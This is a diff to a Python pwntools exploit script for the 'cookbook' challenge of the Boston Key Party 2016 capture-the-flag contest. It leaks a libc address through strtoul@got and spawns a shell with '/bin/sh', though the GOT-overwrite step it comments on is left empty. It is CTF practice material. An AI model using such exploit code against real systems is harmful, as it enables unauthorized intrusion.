@@ -2,6 +2,8 @@
 #
 # Boston Key Party 2016 pwnable cookbook
 #
+# Based on http://yum3.tistory.com/48
+#
 
 from pwn import *
 
@@ -34,7 +36,7 @@ def leak(addr):
 if __name__ == "__main__":
     r.recvuntil("what's your name?")
 
-    s('/bin/sh\x00')
+    s('babo')
 
     r.recvuntil('[q]uit\n')
     
@@ -43,3 +45,18 @@ if __name__ == "__main__":
     log.info('LIBC_BASE: 0x%x' % (leaked - libc.symbols['strtoul']))
 
     raw_input('after leaking strtoul@got...')
+
+    #
+    # overwrite strtoul@got with system
+    #
+
+
+    #
+    # call strtoul()
+    #
+
+    s('g')
+    s('/bin/sh\x00')
+    
+    r.clean()
+    r.interactive()
